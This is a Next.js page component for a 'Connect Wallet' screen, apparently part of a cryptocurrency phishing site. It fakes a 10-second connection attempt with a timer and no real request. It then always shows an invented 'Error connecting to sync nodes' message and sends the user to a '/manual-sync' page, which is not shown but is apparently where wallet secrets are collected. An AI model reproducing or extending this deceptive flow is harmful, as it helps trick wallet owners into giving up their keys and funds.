"use client";

import Link from "next/link";
import { MdOutlineError } from "react-icons/md";
import { useState } from "react";

const page = () => {
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [isModal, setIsModal] = useState(false);

  const handleSubmit = () => {
    if (!url) {
      setError(true);
    } else {
      setError(false);
      setLoading(true);

      setTimeout(() => {
        setLoading(false);
        setIsModal(true);
      }, 10000);
    }
  };

  return (
    <div className="hero">
      <div className="max-w-6xl mx-auto py-56 px-6 flex items-center justify-center">
        <div className="bg-black/10 w-full max-w-xl rounded-lg p-7">
          <h1 className="text-center text-white text-lg font-semibold">
            Connect Wallet
          </h1>
          <p className="text-center text-gray-400 text-[12px] mt-1 max-w-lg">
            Open your preferred wallet in the background and click continue to create connection.
          </p>
          <form className="mt-8">
            <p className="text-gray-400 text-[12px]">URL*</p>
            <input
              required
              type="url"
              placeholder="Enter dApps URL"
              className="bg-inherit w-full text-md text-white outline-none border border-white/15 rounded-lg px-5 py-4 mt-2 focus:shadow-gray-600 focus:shadow-sm placeholder:text-[13px]"
              value={url}
              onChange={(e) => {setUrl(e.target.value); setError(false)}}
            />
            {error && (
              <p className="text-[13px] text-red-600 font-normal mt-2">
                Please enter a valid dApps URL!
              </p>
            )}
            <div className="flex items-center justify-center">
              <button
                onClick={handleSubmit}
                type="button"
                className="button-gradient text-white text-[14px] font-medium rounded-full outline-none px-9 py-3 mt-7"
              >
                {loading ? "Connecting..." : "Continue"}
              </button>
            </div>
          </form>
        </div>
      </div>

      {isModal && (
        <div
          onClick={() => setIsModal(false)}
          className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 px-6"
        >
          <div
            onClick={(e) => e.stopPropagation()}
            className="hero z-50 w-full max-w-lg rounded-lg px-7 py-10"
          >
            <div className="flex items-center justify-center text-white text-[60px]">
              <MdOutlineError />
            </div>
            <h4 className="text-center text-white font-medium mt-4">
              Error connecting to sync nodes
            </h4>
            <p className="text-center text-gray-400 text-[13px] font-normal mt-3">
              An error occured while communicating with the nodes of your
              device. Please try again or connect your wallet manually.
            </p>
            <div className="flex items-center justify-center">
              <Link href={'/manual-sync'} className="button-gradient text-white text-[14px] font-medium rounded-full outline-none px-9 py-3 mt-7">
                Connect
              </Link>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default page;
